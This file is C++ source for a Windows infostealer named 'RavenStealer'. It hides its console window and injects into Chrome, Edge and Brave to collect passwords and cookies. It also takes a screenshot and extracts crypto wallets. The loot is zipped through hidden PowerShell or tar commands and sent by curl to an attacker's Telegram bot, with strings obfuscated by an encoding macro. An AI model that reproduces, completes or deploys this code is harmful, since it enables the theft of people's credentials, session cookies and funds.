std::string FormatTelegramMessage(const ReportData& report, const std::string& system_info) {
    std::string message = "RavenStealer Report for " + system_info + "\n\n";

    if (!report.stolen_wallets.empty()) {
        message += "Wallets Found (" + std::to_string(report.stolen_wallets.size()) + "):\n";
        for (const auto& wallet : report.stolen_wallets) {
            message += "- " + wallet + "\n";
        }
        message += "\n";
    }

    if (report.password_count > 0) {
        message += "Passwords Found: " + std::to_string(report.password_count) + "\n";
    }
    if (report.cookie_count > 0) {
        message += "Cookies Found: " + std::to_string(report.cookie_count) + "\n\n";
    }

    if (!report.gaming_services.empty()) {
        message += "Gaming Services Found (" + std::to_string(report.gaming_services.size()) + "):\n";
        for (const auto& service : report.gaming_services) {
            message += "- " + service + "\n";
        }
        message += "\n";
    }

    if (!report.im_services.empty()) {
        message += "IM Services Found (" + std::to_string(report.im_services.size()) + "):\n";
        for (const auto& service : report.im_services) {
            message += "- " + service + "\n";
        }
        message += "\n";
    }

    if (!report.vpn_services.empty()) {
        message += "VPN Services Found (" + std::to_string(report.vpn_services.size()) + "):\n";
        for (const auto& service : report.vpn_services) {
            message += "- " + service + "\n";
        }
        message += "\n";
    }
    
    if (message.length() < 100) { // If nothing much was found
        message += "No significant data found on this system.";
    }

    return message;
}

std::string GetUserNameStr() {
    char username[256];
    DWORD size = sizeof(username);
    if (api::pGetUserNameA(username, &size)) {
        return std::string(username);
    }
    return "";
}

bool RunCommandHidden(const std::wstring& commandLine) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    // Important: must be mutable string for CreateProcessW
    wchar_t* mutableCmd = _wcsdup(commandLine.c_str());

    BOOL success = CreateProcessW(
        NULL,
        mutableCmd,   // Command line
        NULL, NULL,
        FALSE,
        CREATE_NO_WINDOW,  // No window at all
        NULL, NULL,
        &si, &pi
    );

    free(mutableCmd);

    if (!success)
        return false;

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

std::wstring CompressFolderToZip(const std::wstring& folderPath) {
    wchar_t tempPath[MAX_PATH];
    if (api::pGetTempPathW(MAX_PATH, tempPath) == 0) {
        std::wcerr << ENC_WSTR(L"Failed to get temp path") << std::endl;
        return L"";
    }

    wchar_t username[256];
    DWORD size = sizeof(username) / sizeof(wchar_t);
    if (!api::pGetUserNameW(username, &size)) {
        wcscpy_s(username, ENC_WSTR(L"User"));
    }

    std::wstring zipFileName = std::wstring(tempPath) + username + ENC_WSTR(L"_RavenStealer.zip");


    api::pDeleteFileW(zipFileName.c_str());


    std::wstring command = ENC_WSTR(L"powershell -Command \"try { Compress-Archive -Path '") + folderPath + ENC_WSTR(L"\\*' -DestinationPath '") + zipFileName + ENC_WSTR(L"' -Force -ErrorAction Continue } catch { $_ }\"");

    std::wcout << ENC_WSTR(L"Creating zip file: ") << zipFileName << std::endl;

    std::string narrowCommand(command.begin(), command.end());
    RunCommandHidden(command);


    Sleep(3000);


    if (fs::exists(zipFileName)) {
        std::wcout << ENC_WSTR(L"Zip file created successfully") << std::endl;
        return zipFileName;
    }

   
    std::wcout << ENC_WSTR(L"PowerShell failed, trying tar command...") << std::endl;


    command = ENC_WSTR(L"tar -a -cf \"") + zipFileName + ENC_WSTR(L"\" -C \"") + folderPath + ENC_WSTR(L"\" .");
    narrowCommand = std::string(command.begin(), command.end());
    RunCommandHidden(command);

    Sleep(2000);

    if (fs::exists(zipFileName)) {
        std::wcout << ENC_WSTR(L"Zip file created successfully with tar") << std::endl;
        return zipFileName;
    }

    std::wcerr << ENC_WSTR(L"Failed to create zip file!") << std::endl;
    return L"";
}



std::string WStringToString(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, nullptr, 0, nullptr, nullptr);
    std::string str(size - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &str[0], size, nullptr, nullptr);
    return str;
}

std::string LoadResourceAsString(int resourceId) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hRes = FindResource(hModule, MAKEINTRESOURCE(resourceId), RT_RCDATA);
    if (!hRes) return "";

    HGLOBAL hResLoad = LoadResource(hModule, hRes);
    if (!hResLoad) return "";

    LPVOID pRes = LockResource(hResLoad);
    if (!pRes) return "";

    DWORD dwSize = SizeofResource(hModule, hRes);
    return std::string(static_cast<char*>(pRes), dwSize);
}

std::string EscapeForCurl(const std::string& input) {
    std::string escaped;
    for (char c : input) {
        switch (c) {
            case '"':
                escaped += "\\\"";
                break;
            case '\\':
                escaped += "\\\\";
                break;
            case '\n':
                escaped += "\\n";
                break;
            case '\r':
                escaped += "\\r";
                break;
            case '\t':
                escaped += "\\t";
                break;
            default:
                escaped += c;
                break;
        }
    }
    return escaped;
}
std::wstring StringToWString(const std::string& str) {
    if (str.empty()) return L"";
    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, nullptr, 0);
    std::wstring wstr(size - 1, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &wstr[0], size);
    return wstr;
}

void SendFileWithTelegram(const std::wstring& zipFileName, const std::string& caption, const std::string& chatId, const std::string& botToken) {

    std::string zipFileNameStr = WStringToString(zipFileName);


    if (!fs::exists(zipFileName)) {
        std::cerr << ENC_STR("Zip file does not exist: ") << zipFileNameStr << std::endl;
        return;
    }

    // Escape the message content for command line
    std::string escapedMessage = EscapeForCurl(caption);

    std::string curlCommand = ENC_STR("curl -F \"chat_id=") + chatId + ENC_STR("\" ")
        + ENC_STR("-F \"document=@") + zipFileNameStr + ENC_STR("\" ")
        + ENC_STR("-F \"caption=") + escapedMessage + ENC_STR("\" ")
        + ENC_STR("https://api.telegram.org/bot") + botToken + ENC_STR("/sendDocument");

    std::cout << ENC_STR("Sending file to Telegram...") << std::endl;
    std::cout << ENC_STR("Debug command: ") << curlCommand << std::endl;
    RunCommandHidden(StringToWString(curlCommand));

}


std::string GetDirectoryStructure(const std::string& folderPath) {
    std::string structure;
    for (const auto& entry : std::filesystem::directory_iterator(folderPath)) {
        if (std::filesystem::is_directory(entry.status())) {
            std::string relativePath = entry.path().string();
            size_t pos = relativePath.find(ENC_STR("RavenStealer"));
            if (pos != std::string::npos) {
                relativePath = relativePath.substr(pos + std::string(ENC_STR("RavenStealer")).length() + 1);
                structure += ENC_STR("\n");
            }
        }
    }
    return structure;
}








int wmain(int argc, wchar_t* argv[])
{
    HWND hWnd = GetConsoleWindow();
    if (hWnd != NULL) {
        ShowWindow(hWnd, SW_HIDE);
        // Also remove from taskbar
        SetWindowLongPtr(hWnd, GWL_EXSTYLE,
            GetWindowLongPtr(hWnd, GWL_EXSTYLE) | WS_EX_TOOLWINDOW);
    }
    if (!api::Initialize()) {
        return 1;
    }

    if (argc > 1) {
        return Injector::Run(argc, argv);
    }

    std::string chatId = LoadResourceAsString(IDR_CHAT_ID);
    std::string botToken = LoadResourceAsString(IDR_BOT_TOKEN);

	std::cout << ENC_STR("Chat ID: ") << chatId << std::endl;    
    std::cout << ENC_STR("botToken: ") << botToken << std::endl;

    ReportData report;


    wchar_t exePath[MAX_PATH];
    api::pGetModuleFileNameW(NULL, exePath, MAX_PATH);

    wchar_t appDataPath[MAX_PATH];
    if (SUCCEEDED(api::pSHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath))) {
        wcscat_s(appDataPath, MAX_PATH, ENC_WSTR(L"\\RavenStealer"));
    }

    {
        wchar_t* autoArgs[5];
        autoArgs[0] = exePath;
        autoArgs[1] = const_cast<wchar_t*>(ENC_WSTR(L"--start-browser"));
        autoArgs[2] = const_cast<wchar_t*>(ENC_WSTR(L"--output-path"));
        autoArgs[3] = appDataPath;
        autoArgs[4] = const_cast<wchar_t*>(ENC_WSTR(L"chrome"));

        int result = Injector::Run(5, autoArgs);
        if (result == 0) {
        }
    }

    {
        wchar_t* autoArgs[5];
        autoArgs[0] = exePath;
        autoArgs[1] = const_cast<wchar_t*>(ENC_WSTR(L"--start-browser"));
        autoArgs[2] = const_cast<wchar_t*>(ENC_WSTR(L"--output-path"));
        autoArgs[3] = appDataPath;
        autoArgs[4] = const_cast<wchar_t*>(ENC_WSTR(L"edge"));

        int result = Injector::Run(5, autoArgs);
        if (result == 0) {
        }
    }

    {
        wchar_t* autoArgs[5];
        autoArgs[0] = exePath;
        autoArgs[1] = const_cast<wchar_t*>(ENC_WSTR(L"--start-browser"));
        autoArgs[2] = const_cast<wchar_t*>(ENC_WSTR(L"--output-path"));
        autoArgs[3] = appDataPath;
        autoArgs[4] = const_cast<wchar_t*>(ENC_WSTR(L"brave"));

        int result = Injector::Run(5, autoArgs);
        if (result == 0) {
        }
    }

    // Scan for browser data
    std::wstring wideAppDataPath(appDataPath);
    std::string narrowAppDataPath(wideAppDataPath.begin(), wideAppDataPath.end());
    for (const auto& browser : {"chrome", "edge", "brave"}) {
        fs::path browserDataPath = fs::path(narrowAppDataPath) / browser;
        if(fs::exists(browserDataPath)) {
            for (const auto& entry : fs::directory_iterator(browserDataPath)) {
                std::string filename = entry.path().filename().string();
                if (filename.find("assword") != std::string::npos) { // Passwords or similar
                    report.password_count += CountLinesInFile(entry.path().string());
                } else if (filename.find("ookie") != std::string::npos) { // Cookies or similar
                    report.cookie_count += CountLinesInFile(entry.path().string());
                }
            }
        }
    }

    wchar_t screenshotPath[MAX_PATH];
    wcscpy_s(screenshotPath, MAX_PATH, appDataPath);
    wcscat_s(screenshotPath, MAX_PATH, ENC_WSTR(L"\\screenshot.png"));

    std::wcout << ENC_WSTR(L"Taking screenshot and saving to: ") << screenshotPath << std::endl;
    TakeScreenshot(screenshotPath);





    std::wcout << ENC_WSTR(L"Extracting crypto wallets to: ") << appDataPath << std::endl;
    report.stolen_wallets = ExtractWallets(appDataPath);

  //  ExtractAllServices(appDataPath, report);

    std::string folderStructureBefore = GetDirectoryStructure(narrowAppDataPath);

    std::wstring zipFileName = CompressFolderToZip(appDataPath);

    if (zipFileName.empty()) {
        std::wcerr << ENC_WSTR(L"Failed to create zip file!") << std::endl;
        return 1;
    }
 
    std::string caption = FormatTelegramMessage(report, GetUserNameStr());
    SendFileWithTelegram(zipFileName, caption, chatId, botToken);


    return 0;
}